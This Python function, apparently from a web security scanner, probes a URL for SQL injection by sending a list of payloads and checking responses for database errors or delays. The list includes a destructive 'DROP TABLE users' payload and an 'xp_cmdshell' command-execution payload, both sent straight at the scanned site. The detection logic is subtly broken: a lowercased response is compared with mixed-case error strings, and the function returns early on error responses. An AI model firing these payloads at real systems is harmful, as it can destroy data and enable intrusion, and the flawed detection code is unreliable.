import requests
import time
from tenacity import retry, stop_after_attempt, wait_fixed
from logger import logger  # Import centralized logger

# Retry configuration: retry up to 3 times with a 5-second wait between retries
@retry(stop=stop_after_attempt(3), wait=wait_fixed(5))
def safe_request(url, timeout=10):
    return requests.get(url, timeout=timeout)

def detect_sqli(url):
    """
    Detects SQL Injection vulnerabilities by injecting various payloads.
    """
    logger.info(f"🔎 Scanning {url} for SQL Injection vulnerabilities...")

    payloads = [
        "'", "\"", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "admin' --",
        "1' OR '1'='1' --", "1' ORDER BY 1 --", "1' UNION SELECT NULL --",
        "'; DROP TABLE users; --", "1' AND SLEEP(5) --", "1' AND BENCHMARK(5000000, MD5(1)) --",
        "' OR 'x'='x' --", "admin' #", "1' OR '1'='1' /*", "'; EXEC xp_cmdshell('dir'); --"
    ]

    results = []
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            start_time = time.time()
            response = safe_request(test_url, timeout=15)  # Increased timeout
            if not response:
                return False  # Or handle gracefully
            end_time = time.time()
            
            sql_errors = [
                "syntax error", "mysql_fetch", "mysqli_fetch",
                "SQL syntax", "Warning: mysql_", "You have an error in your SQL syntax",
                "Unclosed quotation mark", "quoted string not properly terminated"
            ]

            if any(error in response.text.lower() for error in sql_errors):  
                logger.warning(f"⚠️ SQL Injection detected at {test_url} with payload: {payload}")
                results.append({
                    "url": test_url,
                    "risk_level": "High",
                    "details": "🚨 Potential SQL Injection detected!",
                    "payload": payload,
                    "mitigation": "Use prepared statements and parameterized queries."
                })

            # Detect time-based SQL injection
            if end_time - start_time > 4:
                logger.warning(f"⚠️ Time-based SQL Injection detected at {test_url} with payload: {payload}")
                results.append({
                    "url": test_url,
                    "risk_level": "High",
                    "details": "🚨 Potential time-based SQL Injection detected!",
                    "payload": payload,
                    "mitigation": "Use input validation and restrict database operations."
                })

        except requests.exceptions.RequestException as e:
            logger.error(f"❌ Error testing {test_url} for SQLi: {str(e)}")

    return {"found": bool(results), "results": results}



